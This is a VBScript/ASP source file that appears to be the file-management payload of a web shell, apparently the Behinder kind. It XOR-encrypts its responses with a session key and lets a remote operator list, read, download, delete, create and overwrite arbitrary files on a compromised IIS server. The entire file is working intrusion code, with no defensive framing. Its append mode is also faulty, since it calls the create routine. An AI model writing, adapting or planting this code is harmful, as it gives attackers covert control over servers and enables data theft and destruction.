Function Base64Encode(sText)
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.nodeTypedValue =Stream_StringToBinary(sText)
    If Mid(oNode.text,1,4)="77u/" Then
    oNode.text=Mid(oNode.text,5)
    End If
    Base64Encode = Replace(oNode.text, vbLf, "")
    Set oNode = Nothing
    Set oXML = Nothing
End Function
Function Base64Decode(ByVal vCode)
    Dim oXML, oNode

    Set oXML = CreateObject("Msxml2.DOMDocument.3.0")
    Set oNode = oXML.CreateElement("base64")
    oNode.dataType = "bin.base64"
    oNode.text = vCode
    Base64Decode = oNode.nodeTypedValue
    Set oNode = Nothing
    Set oXML = Nothing
End Function
Function Stream_StringToBinary(Text)
  Const adTypeText = 2
  Const adTypeBinary = 1
  Dim BinaryStream 'As New Stream
  Set BinaryStream = CreateObject("ADODB.Stream")
  BinaryStream.Type = adTypeText
  BinaryStream.CharSet = "utf-8"
  BinaryStream.Open
  BinaryStream.WriteText Text
  BinaryStream.Position = 0
  BinaryStream.Type = adTypeBinary
  BinaryStream.Position = 0
  Stream_StringToBinary = BinaryStream.Read
  Set BinaryStream = Nothing
End Function


Function Encrypt(data)
key=Session("k")
size=len(data)
For i=1 To size
encryptResult=encryptResult&chrb(asc(mid(data,i,1)) Xor Asc(Mid(key,(i and 15)+1,1)))
Next
Encrypt=encryptResult
End Function

Function list(path)
on error resume next
Dim listResult
listResult="["
Dim fs,sa
Set fso=server.createobject("Scripting.FileSystemObject")
If IsEmpty(fso) Then
Set fso=server.createobject("shell.application")
End If

Set pathObj = fso.GetFolder(path)
Set fsofolders = pathObj.SubFolders
Set fsofile = pathObj.Files

For Each folder in fsofolders
 'folderObj="{""type"":""directory"",""name"":"""&folder.name&""",""size"":"""&folder.size&""",""lastModified"":"""&folder.datelastmodified&"""},"
 size=folder.size
 If Err Then
	size="PermissonDenied"
	lastModified="PermissonDenied"
 Else
	lastModified=folder.datelastmodified
 End If
 Err=0
 folderObj="{""type"":"""&Base64Encode("directory")&""",""name"":"""&Base64Encode(folder.name)&""",""size"":"""&Base64Encode(size)&""",""lastModified"":"""&Base64Encode(lastModified)&"""},"
 listResult=listResult&folderObj
Next

For Each file in fsofile

 size=file.size
 If Err Then
	size="PermissonDenied"
	lastModified="PermissonDenied"
 Else
	lastModified=file.datelastmodified
 End If
 Err=0
fileObj="{""type"":"""&Base64Encode("file")&""",""name"":"""&Base64Encode(file.name)&""",""size"":"""&Base64Encode(size)&""",""lastModified"":"""&Base64Encode(lastModified)&"""},"
listResult=listResult&fileObj
Next 
listResult=listResult&"]"
list=listResult
End Function

Sub SendErr(Err)'检查错误处理
	If Err Then
		message= Err.Description&"Error Source:"&Err.Source
		finalResult="{""status"":"""&Base64Encode("fail")&""",""msg"":"""&Base64Encode(message)&"""}"
		Response.binarywrite(Encrypt(finalResult))
		'Response.write(finalResult)
		Response.End
	End If
End Sub
Function GetStream()
	Set GetStream=CreateObject("Adodb.Stream")
End Function
Function GetFso()
	Dim Fso,Key
	Key="Scripting.FileSystemObject"
	Set Fso=server.CreateObject(Key)
	Set GetFso=Fso
End Function

Function show(FilePath,charset)
	on error resume next
	If FilePath<>"" then
		Dim Stream,filecontent,Fso
		Set Stream=GetStream()
		If IsEmpty(Stream)=false Then
			with Stream
				.type=2
				.mode=3
				.open
				.charset=charset
				.LoadFromFile FilePath
				filecontent=.ReadText()
				.close
			End With
			Set Stream=Nothing
		Else
			Set Fso=GetFso()
			filecontent=Fso.OpenTextFile(FilePath,1).ReadAll
			Set Fso=Nothing
		End If
		show=filecontent
	End If
	If Err Then 
		SendErr err
	End If 
End Function

Sub download(path)
		with Response
		.Clear
		Dim stream,fileContentType
		Set stream=GetStream()
		stream.Open
		stream.Type=1
		stream.LoadFromFile(path)
		.AddHeader "Content-Length",stream.Size
		.Charset="UTF-8"
		.ContentType="application/octet-stream"
		.BinaryWrite stream.Read 
		.Flush
		stream.Close
		Set stream=Nothing
		end with
End Sub

Function delete(path)
	deleteResult=False
	Set Fso=GetFso()
	with Fso
		If .FileExists(path) then 
			.DeleteFile(path)
			If Err Then 
				deleteResult=False
			Else
				deleteResult=True 
			End If 
		End If 
		If .FolderExists(path) then 
			.DeleteFolder(path)
			If Err Then 
				deleteResult=False
			Else
				deleteResult=True 
			End If 
		End If 
	End With
	delete=deleteResult
	set Fso=nothing
End Function

Function create(path, content)
  on error resume next
  uploadResult=False
  Const adTypeBinary = 1
  Const adSaveCreateOverWrite = 2
  
  'Create Stream object
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  
  'Specify stream type - we want To save binary data.
  BinaryStream.Type = adTypeBinary
  
  'Open the stream And write binary data To the object
  BinaryStream.Open
  BinaryStream.Write content
  
  'Save binary data To disk
  BinaryStream.SaveToFile path, adSaveCreateOverWrite
  If Err Then 
				SendErr Err
			Else
				uploadResult=True 
			End If 
 create=uploadResult
End Function

Function append(path, content)
  on error resume next
  appendResult=False
  Const adTypeBinary = 1
  Const adSaveCreateOverWrite = 2
  
  'Create Stream object
  Dim BinaryStream
  Set BinaryStream = CreateObject("ADODB.Stream")
  
  'Specify stream type - we want To save binary data.
  BinaryStream.Type = adTypeBinary
  
  'Open the stream And write binary data To the object
  BinaryStream.Open
  BinaryStream.LoadFromFile path
  BinaryStream.Position = BinaryStream.Size
  BinaryStream.Write content
  
  'Save binary data To disk
  BinaryStream.SaveToFile path, adSaveCreateOverWrite
  If Err Then 
				SendErr Err
			Else
				appendResult=True 
			End If 
 append=uploadResult
End Function

Sub main(arrArgs)
	mode=arrArgs(0)
	path=arrArgs(1)
	Dim finalResult
	If mode="list" Then
		finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(list(path))&"""}"
	ElseIf mode="show" Then
		charset="GBK"
			If  UBound(arrArgs)=2 Then
				charset=arrArgs(2)
			End If
		finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(show(path,charset))&"""}"
	ElseIf mode="download" Then
		download path
	elseif mode="delete" Then
		dim deleteResult
	    If delete(path) Then
	    	deleteResult=chrw(21024)&chrw(38500)&chrw(25104)&chrw(21151)
	    Else
	    	deleteResult=chrw(21024)&chrw(38500)&chrw(22833)&chrw(36133)
	    End If
		finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(path&deleteResult)&"""}"
	ElseIf mode="create" Then
		content=arrArgs(2)
		dim createResult
	    If create(path,Base64Decode(content)) Then
	    	createResult=chrw(19978)&chrw(20256)&chrw(25104)&chrw(21151)
	    	finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(path&createResult)&"""}"
	    Else  
	    	createResult=chrw(19978)&chrw(20256)&chrw(22833)&chrw(36133)
	    	finalResult="{""status"":"""&Base64Encode("fail")&""",""msg"":"""&Base64Encode(path&createResult)&"""}"
	    End If
	ElseIf mode="append" Then
		content=arrArgs(2)
		dim appendResult
	    If create(path,Base64Decode(content)) Then
	    	appendResult=chrw(36861)&chrw(21152)&chrw(25104)&chrw(21151)
	    	finalResult="{""status"":"""&Base64Encode("success")&""",""msg"":"""&Base64Encode(path&appendResult)&"""}"
	    Else  
	    	appendResult=chrw(36861)&chrw(21152)&chrw(22833)&chrw(36133)
	    	finalResult="{""status"":"""&Base64Encode("fail")&""",""msg"":"""&Base64Encode(path&appendResult)&"""}"
	    End If
				
	End If	
	Response.binarywrite(Encrypt(finalResult))
End Sub

